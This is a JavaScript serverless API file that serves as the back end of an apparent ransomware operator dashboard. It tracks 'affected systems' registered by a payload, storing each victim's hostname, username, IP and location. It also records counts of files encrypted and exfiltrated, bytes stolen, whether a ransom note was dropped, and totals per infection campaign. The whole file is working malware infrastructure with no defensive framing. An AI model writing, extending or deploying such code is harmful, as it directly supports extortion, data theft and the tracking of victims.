// vercel-dashboard/api/systems/index.js
// Affected Systems Tracking API

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      case 'DELETE':
        return await handleDelete(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Systems API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// GET /api/systems - List affected systems
async function handleGet(request, response) {
  const { id, campaignId, status, limit = 50, offset = 0 } = request.query;

  if (id) {
    // Single system detail
    const system = await kv.get(`system:${id}`);
    if (!system) return response.status(404).json({ error: 'System not found' });

    // Get file details
    const fileIds = await kv.smembers(`system:${id}:files`) || [];
    const files = [];
    for (const fid of fileIds.slice(0, 200)) {
      const meta = await kv.get(`file:${fid}:meta`);
      if (meta) files.push(meta);
    }

    // Get campaigns
    const campaigns = await kv.smembers(`system:${id}:campaigns`) || [];
    const campaignDetails = [];
    for (const cid of campaigns) {
      const c = await kv.get(`campaign:${cid}`);
      if (c) campaignDetails.push({ id: c.id, name: c.name });
    }

    return response.json({ ...system, files, campaigns: campaignDetails });
  }

  // List systems with filters
  let systemIds = await kv.smembers('global:systems') || [];

  // Filter by campaign
  if (campaignId) {
    const campaignSystems = await kv.smembers(`campaign:${campaignId}:systems`) || [];
    systemIds = systemIds.filter(id => campaignSystems.includes(id));
  }

  // Filter by status
  if (status) {
    const filtered = [];
    for (const sid of systemIds) {
      const sys = await kv.get(`system:${sid}`);
      if (sys && sys.status === status) filtered.push(sid);
    }
    systemIds = filtered;
  }

  // Sort by last seen (newest first)
  const systemsWithTime = [];
  for (const sid of systemIds) {
    const sys = await kv.get(`system:${sid}`);
    if (sys) systemsWithTime.push({ id: sid, lastSeen: sys.lastSeen || sys.firstSeen });
  }
  systemsWithTime.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));

  // Paginate
  const start = parseInt(offset);
  const lim = parseInt(limit);
  const paginatedIds = systemsWithTime.slice(start, start + lim).map(s => s.id);

  const systems = [];
  for (const sid of paginatedIds) {
    const sys = await kv.get(`system:${sid}`);
    if (sys) {
      const stats = await kv.hgetall(`system:${sid}:stats`) || {};
      systems.push({
        id: sys.id,
        victimId: sys.victimId,
        hostname: sys.hostname,
        username: sys.username,
        os: sys.os,
        ip: sys.ip,
        country: sys.country,
        city: sys.city,
        isp: sys.isp,
        status: sys.status,
        firstSeen: sys.firstSeen,
        lastSeen: sys.lastSeen,
        stats: {
          filesEncrypted: parseInt(stats.filesEncrypted || '0'),
          filesExfiltrated: parseInt(stats.filesExfiltrated || '0'),
          bytesExfiltrated: parseInt(stats.bytesExfiltrated || '0'),
          ransomNoteDropped: stats.ransomNoteDropped === 'true'
        }
      });
    }
  }

  response.json({
    systems,
    total: systemIds.length,
    page: Math.floor(start / lim) + 1,
    pageSize: lim
  });
}

// POST /api/systems - Register new affected system (called by payload)
async function handlePost(request, response) {
  const { campaignId, victimId, systemInfo } = request.body;

  if (!campaignId || !victimId) {
    return response.status(400).json({ error: 'campaignId and victimId required' });
  }

  // Check campaign exists
  const campaign = await kv.get(`campaign:${campaignId}`);
  if (!campaign) return response.status(404).json({ error: 'Campaign not found' });

  // Generate or find system ID
  let systemId = `sys_${victimId}`;
  let existing = await kv.get(`system:${systemId}`);

  const now = new Date().toISOString();
  const ip = request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             request.headers['x-real-ip'] || 'unknown';

  // GeoIP from Vercel headers
  const country = request.headers['x-vercel-ip-country'] || 'Unknown';
  const city = request.headers['x-vercel-ip-city'] || 'Unknown';
  const isp = request.headers['x-vercel-ip-isp'] || 'Unknown';

  let system;
  if (existing) {
    // Update existing
    system = {
      ...existing,
      lastSeen: now,
      status: 'active',
      ip,
      country,
      city,
      isp,
      ...systemInfo
    };
  } else {
    // New system
    system = {
      id: systemId,
      victimId,
      campaignId,
      hostname: systemInfo?.hostname || 'Unknown',
      username: systemInfo?.username || 'Unknown',
      os: systemInfo?.os || 'Unknown',
      ip,
      country,
      city,
      isp,
      status: 'active',
      firstSeen: now,
      lastSeen: now,
      tags: []
    };
    await kv.sadd('global:systems', systemId);
    await kv.sadd(`campaign:${campaignId}:systems`, systemId);
  }

  await Promise.all([
    kv.set(`system:${systemId}`, system),
    kv.hset(`system:${systemId}:stats`, {
      filesEncrypted: existing ? (parseInt((await kv.hget(`system:${systemId}:stats`, 'filesEncrypted')) || '0')) : 0,
      filesExfiltrated: 0,
      bytesExfiltrated: 0,
      ransomNoteDropped: false
    }),
    kv.sadd(`system:${systemId}:campaigns`, campaignId)
  ]);

  // Update campaign stats
  await kv.hincrby(`campaign:${campaignId}:stats`, 'totalInfections', existing ? 0 : 1);
  await kv.hset(`campaign:${campaignId}:stats`, 'lastActivity', now);

  response.json({ systemId, isNew: !existing });
}

// PUT /api/systems - Update system (heartbeat, stats, status)
async function handlePut(request, response) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'System ID required' });

  const existing = await kv.get(`system:${id}`);
  if (!existing) return response.status(404).json({ error: 'System not found' });

  const now = new Date().toISOString();
  const updated = {
    ...existing,
    ...updates,
    id,
    lastSeen: now
  };

  // Handle stats updates
  if (updates.stats) {
    const statUpdates = {};
    for (const [key, value] of Object.entries(updates.stats)) {
      if (typeof value === 'number') {
        statUpdates[key] = value;
      }
    }
    if (Object.keys(statUpdates).length > 0) {
      await kv.hset(`system:${id}:stats`, statUpdates);
    }
  }

  await kv.set(`system:${id}`, updated);
  response.json(updated);
}

// DELETE /api/systems - Remove system
async function handleDelete(request, response) {
  const { id } = request.query;
  if (!id) return response.status(400).json({ error: 'System ID required' });

  const existing = await kv.get(`system:${id}`);
  if (!existing) return response.status(404).json({ error: 'System not found' });

  const cleanup = [
    kv.del(`system:${id}`),
    kv.del(`system:${id}:stats`),
    kv.del(`system:${id}:files`),
    kv.del(`system:${id}:campaigns`),
    kv.srem('global:systems', id)
  ];

  if (existing.campaignId) {
    cleanup.push(kv.srem(`campaign:${existing.campaignId}:systems`, id));
  }

  await Promise.all(cleanup);
  response.json({ success: true, deleted: id });
}
